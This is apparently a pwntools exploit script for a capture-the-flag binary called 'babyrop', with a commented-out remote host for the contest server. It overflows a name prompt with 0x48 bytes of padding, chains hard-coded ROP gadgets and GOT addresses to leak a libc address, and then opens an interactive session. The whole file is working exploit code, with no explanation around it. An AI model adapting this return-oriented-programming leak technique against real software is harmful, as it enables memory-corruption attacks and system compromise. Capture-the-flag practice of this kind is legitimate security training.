from pwn import * 

context.log_level = 'debug'
sh = process('./babyrop')   
# sh = remote('dicec.tf', 31924)
gdb.attach(sh, 'b * 0x401030')


pop_rdi = 0x00000000004011d3
pop_rsi_r15 = 0x00000000004011d1
write_got = 0x0000000000404018
_start = 0x401050
libc_start_main_got = 0x0000000000403fe8


# payload = 'a' * 0x48 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(0x0) + p64(0x401030) + p64(_start)
payload = 'a' * 0x48 + p64(pop_rsi_r15) + p64(write_got) + p64(0x0) + p64(0x40114A)
sh.recvuntil('Your name: ')
# sh.recvuntil('Your name: ')
sh.sendline(payload)
libc_addr = u64(sh.recv(8))
log.success('libc_addr: ' + hex(libc_addr))


sh.interactive()